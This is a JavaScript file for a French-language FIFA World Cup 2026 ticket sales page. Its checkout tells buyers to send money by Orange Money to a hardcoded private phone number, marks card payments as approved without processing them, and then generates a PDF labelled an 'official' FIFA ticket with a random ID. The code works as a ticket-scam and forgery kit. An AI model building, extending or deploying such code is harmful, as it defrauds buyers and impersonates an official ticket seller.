const matches = [
    { id: 1, teamA: "Mexique", teamB: "Afrique du Sud", codeA: "mx", codeB: "za", date: "11 Juin 2026", time: "19:00", venue: "Estadio Azteca", city: "Mexico City", price: 200 },
    { id: 2, teamA: "Canada", teamB: "Bosnie", codeA: "ca", codeB: "ba", date: "12 Juin 2026", time: "19:00", venue: "BMO Field", city: "Toronto", price: 180 },
    { id: 3, teamA: "États-Unis", teamB: "Paraguay", codeA: "us", codeB: "py", date: "12 Juin 2026", time: "18:00", venue: "SoFi Stadium", city: "Los Angeles", price: 250 },
    { id: 4, teamA: "Brésil", teamB: "Maroc", codeA: "br", codeB: "ma", date: "13 Juin 2026", time: "18:00", venue: "MetLife Stadium", city: "New York/NJ", price: 300 },
    { id: 5, teamA: "Pays-Bas", teamB: "Japon", codeA: "nl", codeB: "jp", date: "14 Juin 2026", time: "15:00", venue: "AT&T Stadium", city: "Dallas", price: 220 },
    { id: 6, teamA: "Espagne", teamB: "Uruguay", codeA: "es", codeB: "uy", date: "15 Juin 2026", time: "20:00", venue: "Hard Rock Stadium", city: "Miami", price: 260 },
    { id: 7, teamA: "Allemagne", teamB: "Équateur", codeA: "de", codeB: "ec", date: "16 Juin 2026", time: "17:00", venue: "NRG Stadium", city: "Houston", price: 210 },
    { id: 8, teamA: "France", teamB: "Sénégal", codeA: "fr", codeB: "sn", date: "18 Juin 2026", time: "21:00", venue: "Mercedes-Benz Stadium", city: "Atlanta", price: 280 },
    { id: 9, teamA: "Argentine", teamB: "Autriche", codeA: "ar", codeB: "at", date: "20 Juin 2026", time: "19:00", venue: "Gillette Stadium", city: "Boston", price: 350 },
    { id: 10, teamA: "Angleterre", teamB: "Croatie", codeA: "gb-eng", codeB: "hr", date: "22 Juin 2026", time: "18:00", venue: "Lincoln Financial Field", city: "Philadelphia", price: 290 },
    { id: 11, teamA: "Quart de Finale", teamB: "TBD", codeA: "un", codeB: "un", date: "10 Juillet 2026", time: "20:00", venue: "Arrowhead Stadium", city: "Kansas City", price: 500 },
    { id: 12, teamA: "Demi-Finale", teamB: "TBD", codeA: "un", codeB: "un", date: "14 Juillet 2026", time: "20:00", venue: "AT&T Stadium", city: "Dallas", price: 800 },
    { id: 13, teamA: "Finale", teamB: "TBD", codeA: "un", codeB: "un", date: "19 Juillet 2026", time: "15:00", venue: "MetLife Stadium", city: "New York/NJ", price: 1500 }
];

const stadiums = [
    { name: "Estadio Azteca", city: "Mexico City, Mexique", image: "https://images.unsplash.com/photo-1540747913346-19e32dc3e97e?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" },
    { name: "MetLife Stadium", city: "New York/NJ, USA", image: "https://images.unsplash.com/photo-1517262330716-58340d895397?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" },
    { name: "SoFi Stadium", city: "Los Angeles, USA", image: "https://images.unsplash.com/photo-1504450758481-7338eba7524a?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" },
    { name: "AT&T Stadium", city: "Dallas, USA", image: "https://images.unsplash.com/photo-1574629810360-7efbbe195018?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" },
    { name: "Mercedes-Benz Stadium", city: "Atlanta, USA", image: "https://images.unsplash.com/photo-1563820626388-c89b8823f66a?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" },
    { name: "Hard Rock Stadium", city: "Miami, USA", image: "https://images.unsplash.com/photo-1551816230-ef5deaed4a26?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" },
    { name: "BMO Field", city: "Toronto, Canada", image: "https://images.unsplash.com/photo-1522778119026-d647f0596c20?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" },
    { name: "BC Place", city: "Vancouver, Canada", image: "https://images.unsplash.com/photo-1575361204480-aadea25e6e68?ixlib=rb-4.0.3&auto=format&fit=crop&w=800&q=80" }
];

let cart = [];
const DESTINATION_NUMBER = "655043923";

document.addEventListener('DOMContentLoaded', () => {
    displayMatches(matches);
    displayStadiums();

    // Filter Search
    const searchInput = document.getElementById('search-city');
    searchInput.addEventListener('input', (e) => {
        const term = e.target.value.toLowerCase();
        const filtered = matches.filter(m => 
            m.city.toLowerCase().includes(term) || 
            m.teamA.toLowerCase().includes(term) || 
            m.teamB.toLowerCase().includes(term)
        );
        displayMatches(filtered);
    });

    // Payment Tabs
    const btnOrange = document.getElementById('pay-orange');
    const btnCard = document.getElementById('pay-card');
    const formOrange = document.getElementById('orange-form');
    const formCard = document.getElementById('card-form');

    btnOrange.addEventListener('click', () => {
        btnOrange.classList.add('active');
        btnCard.classList.remove('active');
        formOrange.classList.remove('hidden');
        formCard.classList.add('hidden');
    });

    btnCard.addEventListener('click', () => {
        btnCard.classList.add('active');
        btnOrange.classList.remove('active');
        formCard.classList.remove('hidden');
        formOrange.classList.add('hidden');
    });

    // Close Modal
    document.querySelector('.close-modal').onclick = () => {
        document.getElementById('payment-modal').style.display = 'none';
    };
});

function displayMatches(matchesToDisplay) {
    const grid = document.getElementById('match-grid');
    grid.innerHTML = '';

    matchesToDisplay.forEach(match => {
        const flagA = match.codeA !== 'un' ? `https://flagcdn.com/w40/${match.codeA}.png` : 'https://flagcdn.com/w40/un.png';
        const flagB = match.codeB !== 'un' ? `https://flagcdn.com/w40/${match.codeB}.png` : 'https://flagcdn.com/w40/un.png';

        const card = document.createElement('div');
        card.className = 'match-card';
        card.innerHTML = `
            <div class="match-header">${match.date} - ${match.time}</div>
            <div class="match-body">
                <div class="teams">
                    <div class="team">
                        <img src="${flagA}" alt="${match.teamA}" class="flag-img">
                        <span>${match.teamA}</span>
                    </div>
                    <span class="vs">vs</span>
                    <div class="team">
                        <img src="${flagB}" alt="${match.teamB}" class="flag-img">
                        <span>${match.teamB}</span>
                    </div>
                </div>
                <div class="venue-info">${match.venue}, ${match.city}</div>
                <div class="price-tag">À partir de ${match.price} $</div>
                <button class="btn-book" onclick="addToCart(${match.id})">Réserver mon billet</button>
            </div>
        `;
        grid.appendChild(card);
    });
}

function displayStadiums() {
    const grid = document.getElementById('stadium-grid');
    grid.innerHTML = ''; // Nettoyer
    stadiums.forEach(stadium => {
        const card = document.createElement('div');
        card.className = 'stadium-card';
        card.innerHTML = `
            <img src="${stadium.image}" alt="${stadium.name}">
            <div class="stadium-info">
                <h3>${stadium.name}</h3>
                <p>${stadium.city}</p>
            </div>
        `;
        grid.appendChild(card);
    });
}

function addToCart(matchId) {
    const match = matches.find(m => m.id === matchId);
    cart = [{...match, category: 'Standard', finalPrice: match.price}];
    updateCartUI();
    openPaymentModal();
}

function updateTotalPrice() {
    const category = document.getElementById('ticket-category').value;
    const item = cart[0];
    let extra = 0;
    if (category === 'VIP') extra = 200;
    if (category === 'VVIP') extra = 500;
    
    item.category = category;
    item.finalPrice = item.price + extra;
    
    updateOrderSummary();
}

function updateOrderSummary() {
    const summary = document.getElementById('order-summary');
    const item = cart[0];
    summary.innerHTML = `
        <div style="background: #f0f0f0; padding: 15px; border-radius: 5px; margin-bottom: 20px;">
            <p><strong>Match:</strong> ${item.teamA} vs ${item.teamB}</p>
            <p><strong>Catégorie:</strong> ${item.category}</p>
            <p><strong>Total:</strong> <span style="color: #d11242; font-weight: bold;">${item.finalPrice} $</span></p>
            <p style="font-size: 0.8rem; margin-top: 10px; color: #666;">Transfert marchand vers : <strong>${DESTINATION_NUMBER}</strong></p>
        </div>
    `;
}

function openPaymentModal() {
    document.getElementById('ticket-category').value = 'Standard';
    updateOrderSummary();
    document.getElementById('payment-modal').style.display = 'block';
}

function updateCartUI() {
    document.getElementById('cart-count').innerText = cart.length;
}

async function processPayment(method) {
    const item = cart[0];
    if (method === 'orange') {
        const phone = document.getElementById('orange-phone').value;
        if (!phone) {
            alert("Veuillez entrer votre numéro Orange Money.");
            return;
        }
        alert("ACTION REQUISE : Envoyez " + item.finalPrice + "$ au numéro " + DESTINATION_NUMBER + ".\n\nUne fois le transfert effectué, confirmez le message Push sur votre téléphone.");
    } else {
        alert("Paiement par carte bancaire validé.");
    }

    setTimeout(() => {
        generatePDFTicket(item);
        alert("Félicitations ! Votre paiement a été confirmé. Votre billet pour " + item.teamA + " vs " + item.teamB + " est en cours de téléchargement.");
        document.getElementById('payment-modal').style.display = 'none';
        cart = [];
        updateCartUI();
    }, 1500);
}

function generatePDFTicket(item) {
    const { jsPDF } = window.jspdf;
    const doc = new jsPDF({
        orientation: "landscape",
        unit: "mm",
        format: [200, 100]
    });

    // En-tête bleu FIFA
    doc.setFillColor(0, 27, 72);
    doc.rect(0, 0, 200, 25, 'F');
    
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(16);
    doc.text("BILLET OFFICIEL - COUPE DU MONDE FIFA 2026™", 10, 15);
    
    // Corps du billet
    doc.setTextColor(0, 0, 0);
    doc.setFontSize(22);
    doc.text(`${item.teamA.toUpperCase()} VS ${item.teamB.toUpperCase()}`, 10, 45);
    
    doc.setFontSize(12);
    doc.text(`DATE : ${item.date}`, 10, 60);
    doc.text(`HEURE : ${item.time}`, 10, 70);
    doc.text(`STADE : ${item.venue}`, 10, 80);
    doc.text(`VILLE : ${item.city}`, 10, 90);
    
    // Zone latérale Or
    doc.setFillColor(200, 157, 60);
    doc.rect(140, 25, 60, 75, 'F');
    
    doc.setTextColor(255, 255, 255);
    doc.setFontSize(14);
    doc.text("CATÉGORIE", 150, 45);
    doc.setFontSize(20);
    doc.text(item.category, 150, 60);
    
    doc.setFontSize(10);
    doc.text("ID: " + Math.random().toString(36).substr(2, 9).toUpperCase(), 150, 85);
    doc.text("PRIX: " + item.finalPrice + "$", 150, 92);

    doc.save(`Ticket_FIFA2026_${item.teamA}_${item.category}.pdf`);
}
